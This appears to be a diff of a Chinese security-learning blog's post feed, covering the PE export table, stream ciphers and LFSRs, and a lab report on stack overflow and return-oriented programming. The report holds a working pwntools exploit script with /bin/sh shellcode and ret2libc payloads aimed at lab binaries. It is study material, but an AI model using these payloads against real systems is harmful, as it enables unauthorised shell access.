-<h2 id="What’s-EAT"><a href="#What’s-EAT" class="headerlink" title="What’s EAT"></a><strong>What’s EAT</strong></h2><p>与INT相对应，EAT（Exoprt Adress Table）顾名思义，导出表。</p>
-<p> EAT是一种核心机制，使不同的应用程序可以调用库文件中提供的函数，只有通过EAT才能准确求得从相应库中到处函数的起始地址。PE文件内的IMAGE_EXPORT_DIRECTORY保存着导出信息，<strong>且PE文件中仅有一个用来说明EAT的IMAGE_EXPORT_DIRECTORY结构体。</strong>（这点对比IAT：IAT的 IMAGE_IMPORT_DESCRIPTOR结构体以数组形式存在，且有多个成员，这主要是因为PE文件可以同时导入多个库。</p>
-<p>EAT结构体位于PE头中，IMAGE_OPTIONAL_HEADER32.DataDirectory[0]</p>
-<p>  IMAGE_EXPORT_DIRECTORY结构：</p>
-<p>依旧先放结构体定义</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">	DWORD Characteristics;			<span class="comment">//保留 总是定义为0</span></span><br><span class="line">	DWORD TimeDateStamp;			<span class="comment">//文件生成时间</span></span><br><span class="line">	WORD  MajorVersion;				<span class="comment">//主版本号 一般不赋值</span></span><br><span class="line">	WORD  MinorVersion;				<span class="comment">//次版本号 一般不赋值</span></span><br><span class="line">	DWORD Name;						<span class="comment">//模块的真实名称</span></span><br><span class="line">	DWORD Base;						<span class="comment">//索引基数 加上序数就是函数地址数组的索引值</span></span><br><span class="line">	DWORD NumberOfFunctions;		<span class="comment">//地址表中个数</span></span><br><span class="line">	DWORD NumberOfNames;			<span class="comment">//名称表的个数</span></span><br><span class="line">	DWORD AddressOfFunctions;		<span class="comment">//输出函数地址的RVA</span></span><br><span class="line">	DWORD AddressOfNames;			<span class="comment">//输出函数名字的RVA</span></span><br><span class="line">	DWORD AddressOfNameOrdinals;	<span class="comment">//输出函数序号的RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/23/HaVkY3scUndb7fu.png" alt="EXP.jpg"></p>
-<p>Demo: kernel32.dll</p>
-<p><img src="https://i.loli.net/2021/04/23/jnRY8mx1zyHsTWw.png" alt="209.jpg"></p>
-<p>从库中获得函数地址的API为GetProcAddress()函数，该API引用EAT来获取指定API的地址。其过程大致如下：</p>
-<ol>
-<li>利用AddressOfName成员转到“函数名称数组”</li>
-<li>“函数名称数组”中存储着字符串地址，通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为name_index）</li>
-<li>利用AddressOfNameOrdinals成员，转到ordinal数组</li>
-<li>在ordinal数组中通过name_index查找相应ordinal值</li>
-<li>利用AddressOfFunctionis成员转到“函数地址数组”（EAT）</li>
-<li>在“函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址</li>
-</ol>
-<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>PE文件是逆向的一个基础，了解PE文件的结构和动态连接的过程有利于我们更好地理解高级调试。</p>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>windows</tag>
-        <tag>PE文件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2021/04/08/hello_world/</url>
-    <content><![CDATA[<h1 id="一个新的开始"><a href="#一个新的开始" class="headerlink" title="一个新的开始"></a>一个新的开始</h1><blockquote>
-<p>“我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维将一直存在。”</p>
-</blockquote>
-<p>​    几经周折终于面前搭建好了属于自己的博客，一个属于自己的空间。长久以来，我与外界的关系是作为一个消费者，消费物质和内容。2021年希望自己可以做一个生产者，创作者，把博客作为方法，输出和记录一些内容。</p>
-<p><img src="https://i.loli.net/2021/04/09/4OQIETdyGWwLYbX.png" alt="rosie_2560_1600.png">    </p>
-<p>:)</p>
-<p>Hello world.</p>
-]]></content>
-      <categories>
-        <category>my_space</category>
-      </categories>
-      <tags>
-        <tag>say_something</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>中间相遇攻击分析</title>
     <url>/2021/05/08/cryp_%E4%B8%AD%E9%97%B4%E7%9B%B8%E9%81%87%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<h1 id="中间相遇攻击-MITM"><a href="#中间相遇攻击-MITM" class="headerlink" title="中间相遇攻击 - MITM"></a>中间相遇攻击 - MITM</h1><h2 id="What’s-MITM"><a href="#What’s-MITM" class="headerlink" title="What’s MITM"></a>What’s MITM</h2><p>中间相遇攻击(Meet-in-the-middle attack):中间相遇攻击是一种以空间换取时间的一种攻击方法，1977 年由 Diffie 与 Hellman 提出。从个人角度看，这更多地指一种思想，不仅仅适用于密码学攻击，也适用于其他方面，可以降低算法的复杂度。</p>
@@ -936,6 +1087,74 @@ D_{k1}(C)=D_{k2}(E_{k1}(P))=M</script><p>同理：穷举k1解密C得到表项，
         <tag>MITM</tag>
         <tag>triple-DES</tag>
         <tag>double-DES</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/04/08/hello_world/</url>
+    <content><![CDATA[<h1 id="一个新的开始"><a href="#一个新的开始" class="headerlink" title="一个新的开始"></a>一个新的开始</h1><blockquote>
+<p>“我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维将一直存在。”</p>
+</blockquote>
+<p>​    几经周折终于面前搭建好了属于自己的博客，一个属于自己的空间。长久以来，我与外界的关系是作为一个消费者，消费物质和内容。2021年希望自己可以做一个生产者，创作者，把博客作为方法，输出和记录一些内容。</p>
+<p><img src="https://i.loli.net/2021/04/09/4OQIETdyGWwLYbX.png" alt="rosie_2560_1600.png">    </p>
+<p>:)</p>
+<p>Hello world.</p>
+]]></content>
+      <categories>
+        <category>my_space</category>
+      </categories>
+      <tags>
+        <tag>say_something</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>流密码</title>
+    <url>/2021/05/17/cryp_%E6%B5%81%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h2 id="流密码基本概念"><a href="#流密码基本概念" class="headerlink" title="流密码基本概念"></a>流密码基本概念</h2><p>流密码一般逐字节或者逐比特处理信息。</p>
+<p><strong>特点</strong>：</p>
+<ul>
+<li>流密码的密钥长度会与明文的长度相同。</li>
+<li>流密码的密钥派生自一个较短的密钥，派生算法通常为一个伪随机数生成算法。</li>
+</ul>
+<p><strong>类型</strong>：对称加密。</p>
+<p>伪随机数生成算法生成的序列的随机性越强，明文中的统计特征被覆盖的更好。</p>
+<p>流密码加解密非常简单，在已知明文的情况下，可以非常容易地获取密钥流。</p>
+<p>流密码的关键在于设计好的伪随机数生成器。一般来说，伪随机数生成器的基本构造模块为反馈移位寄存器。当然，也有一些特殊设计的流密码，比如 RC4。</p>
+<h2 id="基于LFSR的PRG"><a href="#基于LFSR的PRG" class="headerlink" title="基于LFSR的PRG"></a>基于LFSR的PRG</h2><h3 id="线性反馈移位寄存器LFSR"><a href="#线性反馈移位寄存器LFSR" class="headerlink" title="线性反馈移位寄存器LFSR"></a>线性反馈移位寄存器LFSR</h3><p>概念：线性反馈移位寄存器是指有n个寄存器（称为n-级移位寄存器）R1,R2,…,Rn从右到左排列，每个寄存器中能存放1位二进制数，所有寄存器中的数可以统一向右（或向左）移动1位，称为进动1拍. 即R1的值(b1)右移1位后输出，然后R2的值(b2)送R1 , R3的值(b3)送R2,……最后，Rn的值(bn)送Rn-1.</p>
+<p>LFSR运行基本操作：</p>
+<ol>
+<li><strong>初始化。</strong>首先，LFSR会以给定的种子（即密钥）初始化寄存器，以位（比特）为单位：</li>
+</ol>
+<p><img src="https://i.loli.net/2021/05/17/5aL9UrY7nJtO2Qh.png" alt="LFSR.png"></p>
+<p><strong>2. 抽头。</strong>随后，LFSR从这些比特位中随机选取一些（称作“抽头”），并计算这些抽头的异或：</p>
+<p><img src="https://i.loli.net/2021/05/17/QAHqkRF4IJdY96U.png" alt="LFSR1.png"></p>
+<p><strong>3. 位移并附加。</strong>最后，LFSR将这些抽头异或的结果附加到寄存器开头，并使寄存器向右位移，最后一个比特位作为结果输出：</p>
+<p><img src="https://i.loli.net/2021/05/17/tFKp7D2uXAvTUoQ.png" alt="LFSR2.png"></p>
+<p>初始化寄存器后，每个时钟周期LFSR将执行重复上边这些步骤，选取一些抽头，将它们异或，随后寄存器右移输出最右一位并将异或结果附加到寄存器开头。</p>
+<h3 id="Math-Analyse："><a href="#Math-Analyse：" class="headerlink" title="Math_Analyse："></a>Math_Analyse：</h3><p>线性反馈移位寄存器的反馈函数一般如下</p>
+<script type="math/tex; mode=display">
+a_{i+n}={\sum_{j=1}^{n}c_ja_{i+n-j}}</script><script type="math/tex; mode=display">
+其中，c_j 均在某个有限域 F_q 中。</script><p>既然线性空间是一个线性变换，我们可以得知这个线性变换为</p>
+<p><img src="https://i.loli.net/2021/05/17/OyARqfurLWCPw3l.png" alt="LFSR3.png"></p>
+<p>进而，我们可以求得其特征多项式为</p>
+<script type="math/tex; mode=display">
+f(x)=x^n−{\sum_{i=1}^{n}(c_ix^i)}</script><p>同时，我们定义其互反多项式为</p>
+<script type="math/tex; mode=display">
+\overline{f_{(x)}}=1-x^nf(\frac{1}{x})</script><p>我们也称互反多项式为线性反馈移位寄存器的联结多项式。</p>
+<h3 id="特征多项式和生成函数"><a href="#特征多项式和生成函数" class="headerlink" title="特征多项式和生成函数"></a>特征多项式和生成函数</h3><p>特征多项式</p>
+<script type="math/tex; mode=display">
+P(x)=1+c_1x+c_2x^2+...+c_nx^n</script><h3 id="序列周期与生成函数"><a href="#序列周期与生成函数" class="headerlink" title="序列周期与生成函数"></a>序列周期与生成函数</h3><p>序列的的周期为其生成函数的既约真分式的分母的周期。</p>
+<script type="math/tex; mode=display">
+对于 n 级线性反馈移位寄存器，最长周期为 2^n−1（排除全零）。达到最长周期的序列一般称为 m 序列。</script><ul>
+<li>将两个序列累加得到新的序列的周期为这两个序列的周期的和。</li>
+<li>序列是 n 级 m 序列，当且仅当序列的极小多项式是 n 次本原多项式。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>cryptography</category>
+      </categories>
+      <tags>
+        <tag>流密码</tag>
       </tags>
   </entry>
   <entry>
@@ -1042,6 +1261,182 @@ Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的
       <tags>
         <tag>堆溢出</tag>
         <tag>CVE-2021-3156</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Return Oriented Programming Report</title>
+    <url>/2021/12/07/EzRop/</url>
+    <content><![CDATA[<h1 id="Return-Oriented-Programming-Report"><a href="#Return-Oriented-Programming-Report" class="headerlink" title="Return Oriented Programming Report"></a>Return Oriented Programming Report</h1><h3 id="1-Experiment-requirements"><a href="#1-Experiment-requirements" class="headerlink" title="1.Experiment requirements"></a>1.Experiment requirements</h3><ul>
+<li>针对实验一，通过gdb调试rop1确定Shellcode的地址；此外通过rop1.py的调试脚本确定shellcode的地址；最终拿到shell权限。相关详细分析过程写入报告，并比较两种方法的特点。</li>
+<li>针对实验二的32位环境和64位环境，通过调试分析，完成实际rop2.py和rop3.py(填补空白并修改错误)，最终拿到shell权限。相关详细分析写入报告。</li>
+</ul>
+<h3 id="2-Expriment-Target"><a href="#2-Expriment-Target" class="headerlink" title="2.Expriment Target"></a>2.Expriment Target</h3><ul>
+<li>工具方面：掌握gdb、pwntools等工具的使用。</li>
+<li>理解并掌握基本的ROP技能，能够编写pwntools脚本。</li>
+<li>==分析pwntools在ROP方面实现的原理==</li>
+</ul>
+<h3 id="3-Experimental-process-and-analysis"><a href="#3-Experimental-process-and-analysis" class="headerlink" title="3.Experimental process and analysis"></a>3.Experimental process and analysis</h3><h4 id="3-0-Environment-Settings"><a href="#3-0-Environment-Settings" class="headerlink" title="3.0 Environment Settings"></a>3.0 Environment Settings</h4><p>编译生成rop1，并关闭ASLR</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211001232503783.png" alt="image-20211001232503783"></p>
+<h4 id="3-1-gdb调试rop1"><a href="#3-1-gdb调试rop1" class="headerlink" title="3.1 gdb调试rop1"></a>3.1 gdb调试rop1</h4><p>在vuln处设断点：</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211001233044068.png" alt="image-20211001233044068"></p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211001233222234.png" alt="image-20211001233222234" style="zoom: 80%;" /></p>
+<p>观察到buf数组的首地址为[ebp-0x88]，以此地址为依据进行rop1.py获取真实地址</p>
+<h4 id="3-2-rop1-py分析"><a href="#3-2-rop1-py分析" class="headerlink" title="3.2 rop1.py分析"></a>3.2 rop1.py分析</h4><h5 id="写入一个错误的返回地址得到core转储文件"><a href="#写入一个错误的返回地址得到core转储文件" class="headerlink" title="写入一个错误的返回地址得到core转储文件"></a>写入一个错误的返回地址得到core转储文件</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;rop1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b vuln&#x27;)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode=<span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span></span><br><span class="line">shellcode_addr = <span class="number">0xdeadbeef</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x8c</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h5 id="gdb分析转储文件"><a href="#gdb分析转储文件" class="headerlink" title="gdb分析转储文件"></a>gdb分析转储文件</h5><p>程序由于访问了一段不可访问的内存而导致崩溃，此时ESP指针应该指向返回地址的下一地址</p>
+<p>计算此时ESP相对buf首地址偏移为：0x4(返回地址)+0x8c(buff数组+ebp)=0x90</p>
+<p>所以buf起始地址为ESP-0x90,写入py脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shellcode_addr&#x3D;0xffffd1e0 </span><br></pre></td></tr></table></figure>
+<h5 id="成功GetShell"><a href="#成功GetShell" class="headerlink" title="成功GetShell"></a>成功GetShell</h5><p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211001234529327.png" alt="image-20211001234529327"></p>
+<h5 id="关于GDB调试的分析"><a href="#关于GDB调试的分析" class="headerlink" title="关于GDB调试的分析"></a>关于GDB调试的分析</h5><p>gdb主要功能的实现依赖于一个系统函数ptrace，通过man手册可以了解到，ptrace可以让父进程观察和控制其子进程的检查、执行，改变其寄存器和内存的内容，主要应用于打断点（也是gdb的主要功能）和打印系统调用轨迹。</p>
+<p>ptrace函数原型如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="keyword">pid_t</span> pid,</span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">void</span> *addr, <span class="keyword">void</span> *data)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>gbd调试ptrace基本流程</p>
+<ol>
+<li>gdb调试一个新进程：通过fork函数创建一个新进程，在子进程中执行ptrace(PTRACE_TRACEME, 0, 0, 0)函数，然后通过execv()调用准备调试的程序。</li>
+<li>attach到已运行进程：将pid传递给gdb，然后执行ptrace(PTRACE_ATTACH, pid, 0, 0)。</li>
+</ol>
+<p>在使用参数为PTRACE_TRACEME或PTRACE_ATTACH的ptrace系统调用建立调试关系之后，交付给目标程序的任何信号（除SIGKILL之外）都将被gdb先行截获，gdb因此有机会对信号进行相应处理，并根据信号的属性决定在继续目标程序运行时是否将之前截获的信号实际交付给目标程序。</p>
+<h5 id="关于gdb调试中看到的buf数组首地址和调试core转储文件不一致的解释"><a href="#关于gdb调试中看到的buf数组首地址和调试core转储文件不一致的解释" class="headerlink" title="==关于gdb调试中看到的buf数组首地址和调试core转储文件不一致的解释=="></a>==关于gdb调试中看到的buf数组首地址和调试core转储文件不一致的解释==</h5><p>基于gdb调试原理，可以得知gdb的调试会影响buf’在内存的位置，调试时gdb fork出子线程执行rop1，rop1环境变量继承自gdb，堆栈发生偏移，buf地址偏移。</p>
+<p>core dump 是进程终止运行时进程地址空间内容和进程有关状态的信息的保存，是实际运行时的数据，此buf地址是真实运行的地址。</p>
+<h5 id="不通过Pwntools工具，手动GetShell"><a href="#不通过Pwntools工具，手动GetShell" class="headerlink" title="==不通过Pwntools工具，手动GetShell=="></a>==不通过Pwntools工具，手动GetShell==</h5><p>在分析完毕GDB由于自己的环境变量会改变buff运行时地址后，    下面通过仅用GDB调试实现getShell过程。</p>
+<h6 id="1-首先要解决如何获取二进制shellcode"><a href="#1-首先要解决如何获取二进制shellcode" class="headerlink" title="1.首先要解决如何获取二进制shellcode"></a>1.首先要解决如何获取二进制shellcode</h6><p>用pwntools中的生成shellcode模块生成，但是得到的数据不是bytes类型的要进行转换</p>
+<ul>
+<li><p>方法1 将pwntools生成的shellcode数据直接用write()函数通过’ab+’的方式以二进制写入文件</p>
+</li>
+<li><p>方法2 利用python -m ‘print(b”shellcode”)’输入对应的shellcode到文件，此处踩坑点：必须写入二进制文件，因为python3对字节数据和字符串数据做了严格区分。(由于此处踩坑导致输入shellcode有问题导致后续有大量时间在debug)简单记录下debug过程，通过010edit定位write写入的shellcode和python 方法写入的shellcode区别。</p>
+</li>
+</ul>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014041146515.png" alt="image-20211014041146515"></p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014041205015.png" alt="image-20211014041205015"></p>
+<p>注：justwrite是用write方法二进制写入  justpython是通过上述python方法写入。</p>
+<ul>
+<li>方法3 利用 echo -e -n “\x11\x22” &gt; shellcode -e转义反斜杠 -n不添加行尾行标识符 </li>
+</ul>
+<p>通过以上任意一种方法最后均可得到二进制存储的shellcode</p>
+<h6 id="2-将二进制shellcode作为标准输入传入read-函数"><a href="#2-将二进制shellcode作为标准输入传入read-函数" class="headerlink" title="2.将二进制shellcode作为标准输入传入read()函数"></a>2.将二进制shellcode作为标准输入传入read()函数</h6><p>read(0,buf,128)函数0表示从标准输入中读取，此处不难想到可以通过linux的pipe管道机制作为标准输入传递buf给./rop1函数</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014041959400.png" alt="image-20211014041959400"></p>
+<p>上述命令含义：将bin_with_gdb(shellcode)作为标准输入并执行，可以看到成功写入</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014042124484.png" alt="image-20211014042124484"></p>
+<h6 id="3-修改覆盖的返回地址为0xdeadbeef然后确定shellcode首地址-同gdb-dump过程"><a href="#3-修改覆盖的返回地址为0xdeadbeef然后确定shellcode首地址-同gdb-dump过程" class="headerlink" title="3.修改覆盖的返回地址为0xdeadbeef然后确定shellcode首地址(同gdb dump过程)"></a>3.修改覆盖的返回地址为0xdeadbeef然后确定shellcode首地址(同gdb dump过程)</h6><p>此处和gdb core过程重复不做展开，最终可以得到正确的buf’地址，理论上执行就可getshell(❌)</p>
+<h6 id="4-无法调出shellcode分析Debug"><a href="#4-无法调出shellcode分析Debug" class="headerlink" title="4.无法调出shellcode分析Debug"></a>4.无法调出shellcode分析Debug</h6><p>修改正确buf地址后然后生成相应的shellcode再转为二进制文件，再通过管道传入，但是gdb执行却报错。结果如下：</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014042654043.png" alt="image-20211014042654043"></p>
+<ul>
+<li>首先可以确定的是成功调出了 shell ，此处是 bin/dash ，查看发现 sh:symbolic link to dash</li>
+</ul>
+<p>就是说 bin/sh被成功执行但是重定向到了dash，此时可以确定system函数成功执行</p>
+<ul>
+<li>分析具体报错信息</li>
+</ul>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014043138466.png" alt="image-20211014043138466"></p>
+<p>信息1：</p>
+<p>/bin/dash: 1: jhh///sh/bin��h�41�QjY�Q��1�j</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014043409340.png" alt="image-20211014043409340"></p>
+<p>再r的话就一致重复这个报错回显。</p>
+<p>此处省略冗长试错和查资料分析直接给出原因。</p>
+<p>在gdb r &lt; args执行的时候，此过程将args作为标准输入，然后将shellcode输入到read函数,此过程顺利执行，成功调出dash，问题在于如果不修改args值，后续所有涉及标准输入的过程 gdb都默认将args的内容作为标准输入，所以这也解释了为什么会有/bin/dash: + shellcode的回显，也可以解释为什么进程会一直卡在这里(是因为调起的system函数一直在重复执行 /bin/dash + shellcode)的过程。</p>
+<p>解决方法：在输入完shellcode后置空标准输入，此时system参数将从键盘读取得到交互界面。</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014044048010.png" alt="image-20211014044048010"></p>
+<p>分析（pwntools中的 p.interactive()这个过程其实就是修改标准输入到键盘）</p>
+<h5 id="不通过Pwntools，也不通过GDB进行ROP的尝试"><a href="#不通过Pwntools，也不通过GDB进行ROP的尝试" class="headerlink" title="==不通过Pwntools，也不通过GDB进行ROP的尝试=="></a>==不通过Pwntools，也不通过GDB进行ROP的尝试==</h5><h6 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h6><p>==一个问题==：上述gdb调试过程中得到的buf首地址是 ./rop1 过程中buf的首地址吗？</p>
+<p>答案是：不是</p>
+<p>==验证说明==：利用gdb调试出的shellcode 执行 ./rop1 &lt; shellcode 发现段异常（其实就是存在非法的返回地址或者栈帧结构有问题）</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014044514292.png" alt="image-20211014044514292"></p>
+<h6 id="理论解释-Thanks-to-Stackoverflow😊"><a href="#理论解释-Thanks-to-Stackoverflow😊" class="headerlink" title="==理论解释==:(Thanks to Stackoverflow😊)"></a>==理论解释==:(Thanks to Stackoverflow😊)</h6><p>此处将对GDB影响buf地址进行具体解释，关键在于env的改变，会影响buf首地址的偏移。</p>
+<p>Environment variables are stored together with command line arguments at the top of the process memory layout, above the stack.</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014045043451.png" alt="image-20211014045043451"></p>
+<h6 id="Demo验证"><a href="#Demo验证" class="headerlink" title="Demo验证"></a>Demo验证</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> *envp[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> *rsp;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;env: %p\narg: %p\nrsp: %p\n&quot;</span>, envp, argv, &amp;rsp);</span><br><span class="line">        <span class="keyword">while</span> (*envp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *envp);</span><br><span class="line">                ++envp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>正常执行：</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014045344503.png" alt="image-20211014045344503"></p>
+<p>GDB调试执行：</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014045450468.png" alt="image-20211014045450468"></p>
+<p>对比即可发现rsp位置发生了偏移，这是由于gdb调试的时候先执行本身main函数，然后fork出子进程执行 被调试的函数，子进程的环境变量是继承自gdb的main函数，这就导致了环境变量的不同，继而导致buf偏移量不同</p>
+<h6 id="尝试能找到-rop1执行时buf数组位置并getshell"><a href="#尝试能找到-rop1执行时buf数组位置并getshell" class="headerlink" title="尝试能找到./rop1执行时buf数组位置并getshell."></a>尝试能找到./rop1执行时buf数组位置并getshell.</h6><p>gdb调试时候执行rop1环境变量继承自gdb，pwntools执行rop1的时候环境变量继承自执行python程序，那么能否得到正常 ./rop1执行的buf首地址并执行shellcode呢。理论上可以。</p>
+<ul>
+<li>首先依旧先写0xdeadbeef作为返回地址的shellcode并生成二进制文件</li>
+</ul>
+<p>不做展开</p>
+<ul>
+<li>由于 并不会生成core文件，这里利用dmesg查看segment fault信息（因为没有生成core文件无法gdb调试）</li>
+</ul>
+<p>ps:dmesg存储所有dump信息</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014050517081.png" alt="image-20211014050517081"></p>
+<ul>
+<li>得到esp信息，减去0x90算出shellcode首地址，修改shellcode并生成二进制文件</li>
+</ul>
+<p><img src="C:/Users/%E5%BE%90/AppData/Roaming/Typora/typora-user-images/image-20211014050607826.png" alt="image-20211014050607826"></p>
+<ul>
+<li>理论上，是可以完美通过 ./rop1 &lt; bin_without_gdb执行shellcode，但是却什么也没有发生！！！</li>
+</ul>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211014050755064.png" alt="image-20211014050755064"></p>
+<p>可以确定的是shellcode没问题，不然执行会报错，还可以确定的是控制流是跳转到了shellcode,因为没有让输入信息的过程，也没有hello rop回显。</p>
+<ul>
+<li>分析</li>
+</ul>
+<p>依旧是标准输入的原因，bin_without_gdb作为标准输入通过管道传递给rop1，然后正常执行shellcode调用system函数执行bin/sh，但是问题在于调用bin/sh没有正确的用户参数传入所以此线程直接跳过然后结束线程，也不返回main函数，也就不执行print(“hello rop”)</p>
+<ul>
+<li>解决办法 </li>
+</ul>
+<p>在执行到 bin/sh线程时更改标准输入，然后通过键盘传入命令即可，其实这也就是gdb调试和pwntools做的过程。。</p>
+<h5 id="方法总结："><a href="#方法总结：" class="headerlink" title="方法总结："></a>方法总结：</h5><p>gdb手动执行shellcode的过程能加强对环境变量、gdb调试能力、管道传递参数、标准输入的理解。</p>
+<p>通过pwntools执行ROP方便快捷，不需要知道底层实现原理，只需要理解栈溢出内容即可，不需要考虑具体环境变量、管道重定向、标准输入流的问题，是封装好的便捷工具。</p>
+<p>总之，pwntools就是我们gdb调试过程的一个封装，了解其底层实现原理是学习的目的，实际ROP时还是选用pwntools更方便快捷。</p>
+<h4 id="3-3-rop2-py-32-bit-分析"><a href="#3-3-rop2-py-32-bit-分析" class="headerlink" title="3.3 rop2.py(32-bit)分析"></a>3.3 rop2.py(32-bit)分析</h4><h5 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h5><p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211002010454951.png" alt="image-20211002010454951"></p>
+<p>开启No-eXecute 数据所在页不可执行保护</p>
+<p>验证</p>
+<p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211002011559038.png" alt="image-20211002011559038"></p>
+<h5 id="确定sys地址"><a href="#确定sys地址" class="headerlink" title="确定sys地址"></a>确定sys地址</h5><p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211002020110467.png" alt="image-20211002020110467"></p>
+<h5 id="找到libc-so库中system参数-“-bin-sh”-地址"><a href="#找到libc-so库中system参数-“-bin-sh”-地址" class="headerlink" title="找到libc.so库中system参数(“/bin/sh”)地址"></a>找到libc.so库中system参数(“/bin/sh”)地址</h5><p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211002021617778.png" alt="image-20211002021617778"></p>
+<p>找到system参数/bin/sh地址为0xf7f650af</p>
+<p>payload = b’a’*0x8c + p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr)</p>
+<h5 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h5><p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211002021733640.png" alt="image-20211002021733640"></p>
+<h4 id="3-4-rop3-py-64-bit-分析"><a href="#3-4-rop3-py-64-bit-分析" class="headerlink" title="3.4 rop3.py(64-bit)分析"></a>3.4 rop3.py(64-bit)分析</h4><h5 id="环境准备-amp-工具安装"><a href="#环境准备-amp-工具安装" class="headerlink" title="环境准备&amp;工具安装"></a>环境准备&amp;工具安装</h5><p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211002022329398.png" alt="image-20211002022329398"></p>
+<h5 id="寻找可用gadget"><a href="#寻找可用gadget" class="headerlink" title="寻找可用gadget"></a>寻找可用gadget</h5><p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211002022632142.png" alt="image-20211002022632142"></p>
+<p>确定相对libc偏移为0x215bf，计算得指令地址为：0x7ffff7a035bf     </p>
+<h5 id="查看sys-addr"><a href="#查看sys-addr" class="headerlink" title="查看sys_addr"></a>查看sys_addr</h5><p><img src="https://gitee.com/explorer1113/mypic/raw/master/img/image-20211002023851002.png" alt="image-20211002023851002"></p>
+<p>sys_addr=0x7ffff7a31550</p>
